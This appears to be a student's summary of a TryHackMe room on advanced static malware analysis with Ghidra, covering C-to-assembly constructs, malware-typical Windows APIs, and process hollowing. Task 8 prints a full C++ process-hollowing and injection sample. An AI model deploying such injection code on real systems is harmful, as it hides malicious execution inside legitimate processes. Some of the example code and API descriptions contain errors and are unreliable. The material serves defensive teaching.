# TryHackMe: Advanced Static Analysis summary

Room link: https://tryhackme.com/room/advancedstaticanalysis

> Note: Part of this summary are based on the TryHackMe content, while other sections include external explanation.


# Task-1: Introduction

**Advanced Static Analysis** involves examining malware code and structure **without executing it** to understand its behavior, identify weaknesses, and create detection signatures. This technique allows researchers to reverse engineer malware, analyze its disassembled code, and understand its **core functionality** more deeply than in basic analysis.

The TryHackMe room focuses on:

- Learning how advanced static analysis is performed.
- Exploring **Ghidra’s disassembler** for reversing binaries.
- Recognizing **C language constructs** in assembly code.
- Developing a **systematic approach** to identify key functions efficiently during reverse engineering.

<img width="888" height="487" alt="image" src="https://github.com/user-attachments/assets/0287f494-49e6-48c7-89f8-f3736e98cf95" />

**Prerequisites:**

Completion of the following rooms is recommended:

- *x86 Architecture Overview*
- *x86 Assembly Crash Course*
- *Basic Static Analysis*

# Task-2: Malware Analysis

Malware analysis examines malicious software to understand its capabilities, behavior, and impact. It typically follows four stages — **Basic Static**, **Basic Dynamic**, **Advanced Static**, and **Advanced Dynamic** — each using different tools and techniques. Basic static inspects files without running them (headers, strings, imports). Basic dynamic executes samples in controlled environments to observe behavior (processes, network, filesystem). Advanced dynamic uses sophisticated sandboxes and monitors to reveal evasive or complex runtime behavior. Advanced static digs into disassembled or obfuscated code (using IDA Pro, Ghidra, Binary Ninja, radare2) to reveal hidden functionality, evasion techniques, and attack vectors by examining entry points, code sections, control-flow graphs, and system calls.

**Key steps in advanced static analysis**

- Locate entry point(s) and enumerate system calls used.
- Inspect code and data sections with disassemblers, debuggers, and hex editors.
- Build and analyze the control-flow graph to map execution paths.
- Correlate static findings with observed runtime behavior (system calls, I/O) to infer evasion techniques and potential impact.

# Task-3: Connecting to VM

none

# Task-4: Ghidra: a Quick Overview

### **Ghidra Overview**

Many disassemblers—such as **Cutter, radare2, Ghidra, and IDA Pro**—can be used for malware analysis. However, this room focuses on **Ghidra** because it is **free, open-source**, and feature-rich, making it ideal for learning reverse engineering. The goal is to become comfortable with using a disassembler and apply that knowledge across other tools.

**Ghidra** is a **software reverse engineering (SRE)** tool developed by the NSA. It helps analysts and developers **analyze compiled code** by offering capabilities for **decompiling, disassembling, and debugging** binaries, which aids in understanding a program’s functionality and structure.

### **Key Features of Ghidra**

- **Decompilation:** Converts binary code into readable C-like code for easier understanding.
- **Disassembly:** Translates binaries into assembly instructions for low-level analysis.
- **Debugging:** Includes a debugger to step through code and observe behavior in real time.
- **Automated Analysis:** Identifies functions, variables, and program structures to simplify navigation and comprehension.

![](https://miro.medium.com/v2/resize:fit:945/1*VJl2WoGhEN227KZv57PxfA.png)

**How to use Ghidra for Analysis**

We will explore Ghidra and its features by analyzing a simple `HelloWorld.exe` program that’s located on the Desktop. Here are the steps to perform code analysis using Ghidra:

- Open Ghidra and create a new project.

![](https://miro.medium.com/v2/resize:fit:945/1*8htL6OwrI36jCeqAHIA1RA.png)

- Select **Non-Shared Project** . Selecting **Shared Project** would allow us to share our analysis with other analysts.

![](https://miro.medium.com/v2/resize:fit:945/1*bBxN2JLVEBbtvnT2tTM5fg.png)

- Name the project and set the directory or leave the default path.

![](https://miro.medium.com/v2/resize:fit:945/1*Z5P2hcFvR3LPlPfovKem6w.png)

- Import the malware executable you want to analyze. Now that we have created an empty project, let’s Drag & Drop `HelloWorld.exe` that’s located on the Desktop in that project, or navigate to the Desktop folder and select the program.

![](https://miro.medium.com/v2/resize:fit:945/1*ke7oZbeLlZZtppdD-d3XLw.png)

- Once it’s imported, it shows us the summary of the program as shown below:

![](https://miro.medium.com/v2/resize:fit:945/1*wxm1XUoAXsUVWI4XfGwbqg.png)

- Double-click on **`HelloWorld.exe`** to open it in the Code Browser. When asked to analyze the executable, click on **Yes** .

![](https://miro.medium.com/v2/resize:fit:945/1*yO73LcrrZ7u2ZXkCn2Yt2A.png)

- The next window that appears shows us various analysis options. We can check or uncheck them based on our needs. These plug-ins or add-ons assist Ghidra during the analysis.

![](https://miro.medium.com/v2/resize:fit:945/1*Ke3ITvpLl-juP9oYctxyIw.png)

It will take some time to analyze. The bar on the bottom-right shows the progress. Wait until the analysis is 100%.

**Exploring the Ghidra Layout**

- Ghidra has so many options to aid in our analysis. Its default layout is shown and explained briefly below.

![](https://miro.medium.com/v2/resize:fit:945/1*vEfHIfYzS4MCxfxecibueA.png)

1. **Program Trees:** Shows sections of the program. We can click on different sections to see the content within each. The [**Dissecting PE Headers**](https://tryhackme.com/room/dissectingpeheaders) room explains headers and PE sections in depth.
2. **Symbol Tree:** Contains important sections like Imports, Exports, and Functions. Each section provides a wealth of information about the program we are analyzing.
    - **Imports:** This section contains information about the libraries being imported by the program. Clicking on each API call shows the assembly code that uses that API.
    - **Exports:** This section contains the API/function calls being exported by the program. This section is useful when analyzing a DLL, as it will show all the functions dll contains.
    - **Functions:** This section contains the functions it finds within the code. Clicking on each function will take us to the disassembled code of that function. It also contains the entry function. Clicking on the entry function will take us to the start of the program we are analyzing. Functions with generic names starting with `FUN_VirtualAddress` are the ones that Ghidra does not give any names to.
3. **Data Type Manager:** This section shows various data types found in the program.
4. **Listing:** This window shows the disassembled code of the binary, which includes the following values in order.
    - **Virtual Address**
    - **Opcode**
    - **Assembly Instruction (PUSH, POP, ADD, XOR, etc.)**
    - **Operands**
    - **Comments**
5. **Decompile** : Ghidra translates the assembly code into a pseudo C code here. This is a very important section to look at during analysis as it gives a better understanding of the assembly code.
6. **Toolbar:** It has various options to use during the analysis.
    - **Graph View:** The Graph View in the toolbar is an important option, allowing us to see the graph view of the disassembly.
        
        ![](https://miro.medium.com/v2/resize:fit:945/1*qij26ypT-Cki6234OiazUQ.png)
        
    - **The Memory Map** option shows the memory mapping of the program as shown below:
        
        ![](https://miro.medium.com/v2/resize:fit:945/1*jFbg6OoMepZ8fHcX4xYB2A.png)
        

- This navigation toolbar shows different options to navigate through the code.
    
    ![](https://miro.medium.com/v2/resize:fit:945/1*lACCZZ6zbOHoEyY_pqqgQw.png)
    
- Explore Strings. Go to Search -> For Strings and click Search will give us the strings that Ghidra finds within the program. This window can contain very juicy information to help us during the analysis.
    
    ![](https://miro.medium.com/v2/resize:fit:945/1*WgmmGIyOpEn0oYPQ-YRI6A.png)
    

### **Analyzing HelloWorld in Assembly**

There are many ways to reach the code of interest. To find the assembly code for **`HelloWorld.exe`** , we will double-click on **.text** in the Program Trees section; it will take us to the disassembled code section. Scroll through the disassembled code until you see the call for the messagebox that will display the Hello World string. In the Decompile section, we can see the translated pseudo C code of that function.

The disassembled section shows how the arguments are being pushed, followed by the call to [MessageBoxA](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messageboxa) , responsible for the message box display.

![](https://miro.medium.com/v2/resize:fit:945/1*XnIcZBehzXNIZmk9h71hbg.png)

We explored Ghidra and its features in this task by examining a simple “HelloWorld” program. In the next task, we will use this knowledge to explore different C constructs and their corresponding representations in assembly.

- **Note:** It is trivial to note that the malware’s author may have packed it or used obfuscation or Anti VM / AV detection techniques to make the analysis harder. These techniques will be discussed in the coming rooms.

# Task-5: Identifying C Code Construct in Assembly

Analyzing the assembly code of the compiled binary can be overwhelming for beginners. Understanding the assembly instructions and how various programming components are translated/reflected into the assembly is important. Here, we will examine various C constructs and their corresponding assembly code. This will help us identify and focus on the key parts of the malware during analysis.

You can load the programs present in the Code_Constructs folder in Ghidra as shown below:

![](https://miro.medium.com/v2/resize:fit:945/1*FQHqsqrfyGvjgfl0DNn5GA.png)

There are different approaches to begin analyzing the disassembled code:

- Locate the main function from the **Symbol Tree** section.
- Check the **.text** code from the **Program Trees** section to see the code section and find the entry point.
- Search for interesting **strings** and locate the code from where those strings are referenced.

**Note:** Different compilers add their own code for various checks while compiling. Therefore expect some garbage assembly code that does not make sense.

Code: Hello World

**In C Language**

Hello World is the very first program that we try out in any programming language. Below is a simple C code that will print the “Hello World!” message on the console.

```c
#include <stdio.h>
int main() { printf(“Hello, world!”);
return 0;
}
```

There are two HelloWorld programs. The one on the Desktop shows a message box with the Hello World message. The one in the Code_Constructs folder shows the Hello_World in the terminal.

**In Assembly**

```nasm
section .data
message db ‘HELLO WORLD!!’, 0
section .text
global _start
_start:

; write the message to stdout
mov eax, 4 ; write system call
mov ebx, 1 ; file descriptor for stdout
mov ecx, message ; pointer to message
mov edx, 13 ; message length
int 0x80 ; call kernel
```

This program defines a string “HELLO WORLD!!” in the **.data** section and then uses the **write** system call to print the string to stdout.

**HelloWorld in Ghidra**

Open the `Hello_World.exe` program found in the Code_Constructs folder in Ghidra. Locate the main function and examine the assembly and decompiled C code.

![](https://miro.medium.com/v2/resize:fit:945/1*vD8tYA4GMfCv9fQFO2gwuQ.png)

If we look at the disassembled code in the **Listings View** , we can see instructions to push HELLO WORLD!! to the stack before calling the print function.

**Code: For Loop**

A For loop is an essential programming component to repeat certain instructions until the loop is complete.

**In C Language**

The following code shows a simple for loop, displaying a message ten times.

```c
int main() {
for (int i = 1; i <= 5; i++) {
std::cout << i << std::endl;
}
return 0;
}
```

For loop In Assembly

```nasm
main:
mov ecx, 1 ; initialize loop counter to 1
mov edx, 5 ; loop 5 times

loop ; start the loop

push ecx 
push format
call printf ; print the loop counter
add esp, 8
inc ecx ; increment loop counter
cmp ecx, edx ; check if the loop is finished

jle loop ; jump if less than or equal
```

In this code, the main function initializes the loop counter ecx to 1, and the loop limit edx to 5. The loop label is used to mark the beginning of the loop. Inside the loop, the loop counter is printed to the console using the `printf`function from the standard C library. After printing the loop counter, the loop counter is incremented, and the loop limit is checked to see if the loop should continue. The loop continues if the counter is still less than or equal to the loop limit. If the loop counter exceeds the loop limit, the loop terminates, and control is passed to the end of the program, where the program returns 0.

**For Loop In Ghidra**

Open the `for-loop.exe` program found in the Code_Constructs folder in Ghidra. Locate the entry function and examine the assembly and decompiled C code.

![](https://miro.medium.com/v2/resize:fit:945/1*tbJL9uoc8whb3crsFTytMQ.png)

We can see how the for loop is translated into disassembled code.

Code: Function

A Function is a key component of any programming language. It is a self-contained block of code that performs a specific task.

**In C Language**

Here is a simple add function in a C program to demonstrate how functions work and how they are translated into the assembly.

```c
int add(int a, int b){
int result = a + b;
return result;
}
```

**In Assembly**

```nasm
add:
push ebp ; save the current base pointer value
mov ebp, esp ; set base pointer to current stack pointer value
mov eax, dword ptr [ebp+8] ; move the value of ‘a’ into the eax register
add eax, dword ptr [ebp+12] ; add the value of ‘b’ to the eax register
mov dword ptr [ebp-4], eax ; move the sum into the ‘result’ variable
mov eax, dword ptr [ebp-4] ; move the value of ‘result’ into the eax register
pop ebp ; restore the previous base pointer value
ret ; return to calling function
```

The add function starts by saving the current base pointer value onto the stack. Then, it sets the base pointer to the current stack pointer value. The function then moves the values of a and b into the eax register, adds them, and store the result in the result variable. Finally, the function moves the value of the result into the eax register, restores the previous base pointer value, and returns to the calling function.

**Code: While loop**

```c
int i = 0;
while (i < 10) {
printf(“%d\\n”, i);
i++;
}
```

**While Loop in Assembly**

```nasm
mov ecx, 0 ; initialize i to 0
loop_start:
cmp ecx, 10 ; compare i to 10
jge loop_end ; jump to loop_end if i >= 10
push ecx ; save the value of i on the stack
push format ; push the format string for printf
push dword [ecx]; push the value of i for printf
call printf ; call printf to print the value of i
add esp, 12 ; clean up the stack
inc ecx ; increment i
jmp loop_start ; jump back to the start of the loop

loop_end:
```

In this example, the mov instruction initializes the register ecx to 0 , representing the variable i . The loop_start label marks the beginning of the loop. The cmp instruction compares the value of ecx to 10 . If ecx exceeds or equals 10 , the loop ends, and the program jumps to the loop_end label. Otherwise, the value of ecx is pushed onto the stack, along with the format string and the value of ecx itself to be printed using `printf`. The add instruction cleans up the stack after the printf call. Finally, the value of ecx is incremented, and the program jumps back to the loop_start label to repeat the loop.

**While Loop In Ghidra**

Open the `While-Loop.exe`program in Ghidra. Go to the Functions tab in the Symbol Tree section, and locate the main function.

![](https://miro.medium.com/v2/resize:fit:945/1*IApIxk7SxyNXyapD4G_5Yw.png)

In this program, a text is printed five times until the value of the counter variable reaches 5. We can observe the assembly instructions on how the counter variable is set, how the loop works, and how the program uses the jump instructions to satisfy the conditions.

It is important to note that, different compilers would compile the programs differently, adding compiler-related code. To demonstrate, the programs used in this room are compiled using different compilers. Therefore, you may find the difference in the interpretation of assembly code.

**Task:** Examine the **if-else.exe** and **while-loop.exe** and answer the questions below.

What value gets printed by the while loop in the while-loop.exe program?

**ITs_Fun_to_Learn_at_THM**

![](https://miro.medium.com/v2/resize:fit:945/1*NK46f0ObtdByyt8FB9CL6g.png)

How many times, the while loop will run until the condition is met?

**4**

![](https://miro.medium.com/v2/resize:fit:945/1*aovWkLkKNEYEzfCPYUXiLQ.png)

Examine the while-loop.exe in Ghidra. What is the virtual address of the instruction that CALLS to print out the sentence “That’s the end of while loop ..”?

**00401543**

![](https://miro.medium.com/v2/resize:fit:945/1*j5X5x-GxDwn9Ev-XJyb6IA.png)

What is the virtual address of the CALL to the main function in the if-else.exe program?

**00401509**

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:945/1*g5gUApWkAeVI8KL8GVFsZw.png)

# Task-6: An Overview of Windows API Calls

The Windows API is a collection of functions and services the Windows Operating System provides to enable developers to create Windows applications. These functions include creating windows, menus, buttons, and other user-interface elements and performing tasks such as file input/output and network communication. Let’s take an example of a very common API function: [CreateProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa).

**Create Process API**

The CreateProcessA function creates a new process and its primary thread. The function takes several parameters, including the name of the executable file, command-line arguments, and security attributes.

![](https://miro.medium.com/v2/resize:fit:945/1*Nkb0gn8I51DB-JfKErGiKg.png)

Here is an example of C code that uses the CreateProcessA function to launch a new process:

```c
#include
int main()
{
STARTUPINFO si;
PROCESS_INFORMATION pi;
ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&pi, sizeof(pi));
if (!CreateProcess(NULL, “C:\\\\Windows\\\\notepad.exe”, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))

{
printf(“CreateProcess failed (%d).\\n”, GetLastError());
return 1;
}

WaitForSingleObject(pi.hProcess, INFINITE);
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
return 0;

}
```

When compiled into assembly code, the CreateProcessA function call looks like this:

```nasm
push 0
lea eax, [esp+10h+StartupInfo]
push eax
lea eax, [esp+14h+ProcessInformation]
push eax
push 0
push 0
push 0
push 0
push 0
push 0
push dword ptr [hWnd]
call CreateProcessA
```

This assembly code pushes the necessary parameters onto the stack in **reverse order** and then calls the CreateProcessA function. The CreateProcessA function then launches a new process and returns a handle to the process and its primary thread.

During malware analysis, identifying the API call and examining the code can help understand the malware’s purpose.

# Task-7: Common API used by Malware

Malware authors rely heavily on **Windows APIs** to perform malicious activities such as logging keystrokes, downloading additional payloads, communicating with C2 servers, stealing data, injecting processes, and evading detection.

Analyzing the imported APIs during **advanced static analysis** can reveal a lot about a malware’s functionality.

### **1. Keylogger**

Malware that records keystrokes often uses these Windows APIs:

- **`SetWindowsHookEx`** – Installs a hook procedure into a hook chain to monitor system events (like keyboard or mouse actions).
- **`GetAsyncKeyState`** – Checks the status of a specific key (pressed/released).
- **`GetKeyboardState`** – Retrieves the state of all virtual keys on the keyboard.
- **`GetKeyNameText`** – Retrieves the name of a key.

**Purpose:** To intercept, record, and map user keystrokes to capture sensitive information like **passwords** and **credit card numbers**.

### **2. Downloader**

A **downloader** installs additional malware by connecting to remote servers and fetching new payloads.

Common APIs include:

- **`URLDownloadToFile`** – Downloads a file from the internet and saves it locally.
- **`WinHttpOpen`** – Initializes the WinHTTP API to set up an HTTP session.
- **`WinHttpConnect`** – Establishes a connection with a remote server.
- **`WinHttpOpenRequest`** – Opens an HTTP request to send or receive data.

**Purpose:** To **download and execute additional malicious components** or updates from attacker-controlled servers.

### **3. Command and Control (C2) Communication**

C2 communication lets malware receive commands or send stolen data to attackers.

Typical APIs used:

- **`InternetOpen`** – Starts an internet session for communication.
- **`InternetOpenUrl`** – Opens a specific URL for downloading data or connecting to a C2 server.
- **`HttpOpenRequest`** – Opens an HTTP request for data exchange.
- **`HttpSendRequest`** – Sends HTTP requests, allowing malware to send data or receive commands.

**Purpose:** Maintain **remote communication** with attackers for **control, updates, or data theft**.

### **4. Data Exfiltration**

Malware uses these APIs to transfer stolen information outside the system:

- **`InternetReadFile`** – Reads data from an internet resource (used to send stolen data).
- **`FtpPutFile`** – Uploads a file to a remote FTP server.
- **`CreateFile`** – Opens or creates files to read local data.
- **`WriteFile`** – Writes stolen data into files before sending it out.
- **`GetClipboardData`** – Reads sensitive content copied to the clipboard (like passwords).

**Purpose:** To **collect and transmit sensitive information** from the victim’s machine to external servers.

### **5. Dropper**

A **dropper** installs or injects other malware components onto a system.

Common APIs include:

- **`CreateProcess`** – Starts a new process, often used to launch malicious payloads under legitimate process names.
- **`VirtualAlloc`** – Allocates memory space to load or decrypt additional code.
- **`WriteProcessMemory`** – Writes malicious code into another process’s memory space.

➡️ **Purpose:** To **install or inject** malware while **disguising activity** within legitimate processes.

### **6. API Hooking**

Hooking allows malware to intercept and modify normal system function calls to hide or manipulate activity.

Used APIs:

- **`GetProcAddress`** – Finds the address of a specific function in a DLL, used to hook system calls.
- **`LoadLibrary`** – Loads a DLL into memory to import or replace functions dynamically.
- **`SetWindowsHookEx`** – Installs a hook to intercept system messages or events.

**Purpose:** To **monitor, alter, or hide API behavior**, evade detection, and gain deeper system control.

### **7. Anti-Debugging and VM Detection**

These techniques help malware detect if it’s being analyzed in a sandbox or debugger and change its behavior accordingly.

Common APIs:

- **`IsDebuggerPresent`** – Checks if a debugger is attached.
- **`CheckRemoteDebuggerPresent`** – Detects remote debugging on the process.
- **`NtQueryInformationProcess`** – Gathers detailed process information, used to detect debugging.
- **`GetTickCount`** – Measures system uptime to detect time discrepancies typical in virtual environments.
- **`GetModuleHandle`** – Checks for modules used in virtual environments.
- **`GetSystemMetrics`** – Retrieves system metrics to detect virtualization clues.

**Purpose:** To **evade detection** by **security tools**, **researchers**, or **virtual machines**.

# Task-8: Process Hollowing: Overview

Process hollowing is a process-injection technique where malware creates or uses a legitimate process, replaces the process’s memory image with malicious code, and then resumes execution so the injected code runs inside the context of that legitimate process. This helps malware evade detection (antivirus, monitoring tools) because the running process appears legitimate.

## High-level steps

1. **Create a suspended process**
    - Use `CreateProcessA()` (often with `CREATE_SUSPENDED`) to start a target "host" process but keep it suspended so its memory and thread state can be modified safely.
2. **Suspend the process (if needed)**
    - `NtSuspendProcess()` can be used to suspend a running process (some implementations create suspended directly).
3. **Allocate memory in the target process**
    - `VirtualAllocEx()` reserves/commits memory in the target process’ address space for the malicious image.
4. **Write malicious code into the target**
    - `WriteProcessMemory()` is used to write the malicious executable’s headers, sections, and payload into the allocated memory.
5. **Fix up the entry point / thread context**
    - Use `GetThreadContext()` to read the suspended thread’s registers.
    - Modify registers (e.g., set EIP/RIP or EAX depending on architecture and approach) with `SetThreadContext()` so the thread’s instruction pointer points to the injected code’s entry point.
6. **Resume the process**
    - `NtResumeProcess()` or `ResumeThread()` is called so the process executes from the new entry point (the injected code).
7. **Cleanup**
    - Close handles and free any temporary resources. The malicious code now executes under the guise of the legitimate process.

## Key Windows APIs mentioned

- `CreateProcessA()` / `CreateProcess` (with `CREATE_SUSPENDED`) — start process suspended.
- `NtSuspendProcess()` / `NtResumeProcess()` — suspend/resume an entire process (native APIs).
- `VirtualAllocEx()` — allocate memory in remote process.
- `WriteProcessMemory()` — write bytes into remote process memory.
- `GetThreadContext()` / `SetThreadContext()` — read/modify thread registers (set entry point).
- `ResumeThread()` — resume suspended thread.

## C++ sample — workflow explained (step-by-step)

```cpp
#include
#include
#include
using namespace std;

bool HollowProcess(char *szSourceProcessName, char *szTargetProcessName)
{
HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
PROCESSENTRY32 pe;
pe.dwSize = sizeof(PROCESSENTRY32);

if (Process32First(hSnapshot, &pe))
{
do
{
if (_stricmp((const char*)pe.szExeFile, szTargetProcessName) == 0)
{
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
if (hProcess == NULL)
{
return false;
}

IMAGE_DOS_HEADER idh;
IMAGE_NT_HEADERS inth;
IMAGE_SECTION_HEADER ish;

DWORD dwRead = 0;

ReadProcessMemory(hProcess, (LPVOID)pe.modBaseAddr, &idh, sizeof(idh), &dwRead);
ReadProcessMemory(hProcess, (LPVOID)(pe.modBaseAddr + idh.e_lfanew), &inth, sizeof(inth), &dwRead);

LPVOID lpBaseAddress = VirtualAllocEx(hProcess, NULL, inth.OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

if (lpBaseAddress == NULL)
{
return false;
}

if (!WriteProcessMemory(hProcess, lpBaseAddress, (LPVOID)pe.modBaseAddr, inth.OptionalHeader.SizeOfHeaders, &dwRead))
{
return false;
}

for (int i = 0; i < inth.FileHeader.NumberOfSections; i++)
{
ReadProcessMemory(hProcess, (LPVOID)(pe.modBaseAddr + idh.e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER))), &ish, sizeof(ish), &dwRead);
WriteProcessMemory(hProcess, (LPVOID)((DWORD)lpBaseAddress + ish.VirtualAddress), (LPVOID)((DWORD)pe.modBaseAddr + ish.PointerToRawData), ish.SizeOfRawData, &dwRead);
}

DWORD dwEntrypoint = (DWORD)pe.modBaseAddr + inth.OptionalHeader.AddressOfEntryPoint;
DWORD dwOffset = (DWORD)lpBaseAddress — inth.OptionalHeader.ImageBase + dwEntrypoint;

if (!WriteProcessMemory(hProcess, (LPVOID)(lpBaseAddress + dwEntrypoint — (DWORD)pe.modBaseAddr), &dwOffset, sizeof(DWORD), &dwRead))
{
return false;
}

CloseHandle(hProcess);

break;
}
} while (Process32Next(hSnapshot, &pe));
}

CloseHandle(hSnapshot);

STARTUPINFO si;
PROCESS_INFORMATION pi;

ZeroMemory(&si, sizeof(si));
ZeroMemory(&pi, sizeof(pi));

if (!CreateProcess(NULL, szSourceProcessName, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
{
return false;
}

CONTEXT ctx;
ctx.ContextFlags = CONTEXT_FULL;

if (!GetThreadContext(pi.hThread, &ctx))
{
return false;
}

ctx.Eax = (DWORD)pi.lpBaseOfImage + ((IMAGE_DOS_HEADER*)pi.lpBaseOfImage)->e_lfanew + ((IMAGE_NT_HEADERS*)(((BYTE*)pi.lpBaseOfImage) + ((IMAGE_DOS_HEADER*)pi.lpBaseOfImage)->e_lfanew))->OptionalHeader.AddressOfEntryPoint;

if (!SetThreadContext(pi.hThread, &ctx))
{
return false;
}

ResumeThread(pi.hThread);
CloseHandle(pi.hThread);
CloseHandle(pi.hProcess);

return true;
}

int main()
{
char* szSourceProcessName = “C:\\\\Windows\\\\System32\\\\calc.exe”;
char* szTargetProcessName = “notepad.exe”;

if (HollowProcess(szSourceProcessName, szTargetProcessName))
{
cout << “Process hollowing successful” << endl;
}
else
{
cout << “Process hollowing failed” << endl;
}

return 0;
}
```

The sample implements two main phases:

**Phase A — (Enumeration & injection into an existing target process)**

- Create a snapshot of running processes: `CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)`.
- Iterate processes with `Process32First` / `Process32Next` to find a process whose filename matches `szTargetProcessName`.
- Open the target process with `OpenProcess(PROCESS_ALL_ACCESS, …)`.
- Read the target process’s PE headers (IMAGE_DOS_HEADER, IMAGE_NT_HEADERS) via `ReadProcessMemory()` using the process base address (pe.modBaseAddr).
- Call `VirtualAllocEx()` in the target to allocate `SizeOfImage` bytes with `PAGE_EXECUTE_READWRITE`.
- Use `WriteProcessMemory()` to:
    - Write the PE headers into the newly allocated region.
    - For each section (read via `IMAGE_SECTION_HEADER`), write the section raw data into the corresponding `VirtualAddress` offset within the allocated region.
- Compute/adjust the entry point offsets: calculate offsets so execution jumps to the malicious image entrypoint once executed.
- Write any required jump/patch into the target process memory (the sample writes an offset) and close the process handle.

**Phase B — (Create a new suspended process and redirect its entrypoint)**

- Prepare `STARTUPINFO`/`PROCESS_INFORMATION`.
- Create a new process from `szSourceProcessName` using `CreateProcess(..., CREATE_SUSPENDED, ...)`.
- Retrieve the thread context (`CONTEXT`) with `GetThreadContext(pi.hThread)` and set the context flags (`CONTEXT_FULL`).
- Calculate the address of the entry point within the created image (using `lpBaseOfImage`, DOS header offset, NT header, `OptionalHeader.AddressOfEntryPoint`) and set a register (in the sample they set `ctx.Eax`) to point to that entry point.
- Apply the changed thread context with `SetThreadContext(pi.hThread, &ctx)`.
- Resume execution by calling `ResumeThread(pi.hThread)`.
- Close handles (`pi.hThread`, `pi.hProcess`) and return success.

**Note:** The sample mixes two different approaches:

- It first finds and writes into an existing process (searching for `szTargetProcessName`) — a direct remote process injection scenario.
- Then it creates a suspended source process (`szSourceProcessName`) and modifies its thread context to point at the injected entry point — classic hollowing approach where you start a benign process suspended and repoint it to malicious code.

---

## Why this technique is effective

- The malware runs under the name, PID, and security context of a legitimate process (e.g., `calc.exe`, `notepad.exe`) which can evade simple signature- or process-name-based detections.
- Some security tools trust certain system processes or ignore activity inside them, increasing stealth.

## Detection & mitigation hints (brief)

- **Anomalous memory regions:** A benign process with unexpected executable memory regions or cross-process writes (`WriteProcessMemory`) can be suspicious.
- **Unexpected thread context changes:** Hooks or sudden entry-point changes in suspended processes are indicators.
- **Behavioral monitoring:** High-fidelity EDR that correlates `CreateProcess` + `VirtualAllocEx` + `WriteProcessMemory` + `SetThreadContext` in close sequence is a strong signal.
- **Hardened process creation:** Using process creation flags that prevent modification or monitoring of important system processes, and restricting what accounts can create processes, helps reduce risk.

# Task-9: Analyzing Process Hollowing

Now that we understand what process hollowing is and how we can use the Ghidra disassembler to analyze the malware to get a better understanding of the ins and outs of it, let’s create a new project and load the Benign.exe sample that is located on the Desktop into Ghidra.

An important point to note is that almost all malware comes packed with known or custom packers and also have employed different Anti-debugging / VM detection techniques to hinder the analysis. This topic will be covered in the next room. The sample is not packed in this task, and no Anti-debugging / VM detection technique is applied.

Our objective of advanced static analysis would be to:

- Examine the API calls to find a pattern or suspicious call.
- Look at the suspicious strings.
- Find interesting or malicious functions.
- Examine the disassembled/decompiled code to find as much information as possible.

Let’s begin the analysis.

**Load the Sample:** Load the program; it will show the summary as shown below:

![](https://miro.medium.com/v2/resize:fit:945/1*pHwNWWBQYv846OJV-nJ5Wg.png)

**Analyze:** Let Ghidra analyze the sample.

![](https://miro.medium.com/v2/resize:fit:945/1*BBZ_Gv6VvIqpKmoi1ID9pg.png)

Ghidra does not automatically land at the start of the program. It’s up to us to pick which function we want to analyze first. We will start looking at the Windows APIs used to accomplish process hollowing.

- **Note:** It’s important to mention that starting to search for the CreateProcessA function right away is not how an analyst would start analyzing an unknown binary.

### **CreateProcess**

We learned in the previous task that in process hollowing, the suspicious process creates a victim process in the suspended state. To confirm, let’s search for the CreateProcessA API in the Symbol Tree section. Then, right-click on the **Show References to option** to display all the program sections where this function is called.

![](https://miro.medium.com/v2/resize:fit:945/1*qrQNUYl2CF2Lvcd3FtmQAw.png)

![](https://miro.medium.com/v2/resize:fit:945/1*EHSteyosVTvQL_jmiUc0fg.png)

Clicking on the first reference will take us to the disassembled code and show the decompiled C code in the Decompile section.

![](https://miro.medium.com/v2/resize:fit:945/1*Dj_sy1XfyFlELsBnzmStJg.png)

It clearly shows how the parameters on the stack are being pushed in reverse order before calling the function. The value 0x4 in the [process creation flag](https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags) is being pushed into the stack, representing the suspended state.

![](https://miro.medium.com/v2/resize:fit:945/1*5GYbB_iCtH-cDyqyDA7New.png)

**Graph View**

Clicking on the **Display Function Graph** in the toolbar will show the graph view of the disassembled code we are examining.

![](https://miro.medium.com/v2/resize:fit:945/1*uwP-EJ4em3maIu1zo4mi0g.png)

In the above case, if the program:

- Fails to create a victim process in the suspended state, it will move to block 1. The red arrow represents the failure to meet the condition mentioned above.
- Successfully creates the victim process, it will move to block 2. The green arrow represents the success of the jump condition.

### **Open Suspicious File**

The [CreateFileA](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) API is used to either create or open an existing file. Let’s search for this API call in the Symbol Tree section and go to the code where it is referencing to.

![](https://miro.medium.com/v2/resize:fit:945/1*Xe0a1wYzAoxjjQrmAoXYtQ.png)

### **Hollow the Process**

Malware use `ZwUnmapViewOfSection` or `NtUnmapViewOfSection` API calls to unmap the target process’s memory. Let’s search for both and see if either API is called.

![image.png](attachment:f88eb41f-1132-4479-9288-622f5ea6b1e7:image.png)

`NtUnmapViewOfSection`takes exactly two arguments, the base address (virtual address) to be unmapped and the handle to the process that needs to be hollowed.

### **Allocate Memory**

Once the process is hollowed, malware must allocate the memory using [VirtualAllocEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) before writing the process. Let’s find instances of VirtualAllocEx API calls in the same way. Arguments passed to the function include a handle to the process, address to be allocated, size, allocation type, and memory protection flag.

![](https://miro.medium.com/v2/resize:fit:945/1*i0sN_2nxxS8ahgWRxJ5ZFg.png)

### **Write Down the Memory**

Once the memory is allocated, the malware will attempt to write the suspicious process/code into the memory of the hollowed process. The [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) API is used for this purpose. Let’s locate the function and analyze the code.

![image.png](attachment:da81a793-cf5d-443b-a20e-c26e6b867342:image.png)

There were three calls to the WriteProcessMemory Function. The last call references to the code in the Kernel32 DLL; therefore, we can ignore that. From the decompiled code, it seems the program is copying different sections of the suspicious process one by one.

### **Resume thread**

